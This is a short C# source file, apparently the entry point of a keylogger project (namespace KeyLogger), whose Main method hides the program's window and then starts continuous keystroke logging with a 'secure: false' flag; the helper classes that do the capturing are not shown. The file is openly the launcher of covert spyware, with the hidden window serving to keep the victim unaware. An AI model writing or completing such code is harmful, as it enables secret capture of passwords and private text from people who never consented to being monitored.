using System.ComponentModel.Design;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.IO;

namespace KeyLogger
{
    internal class Program
    {
        static void Main(string[] args)
        {
            WindowHelper.HideWindow();

            KeyLogger.LogContinuous(secure: false);
        }
    }
}
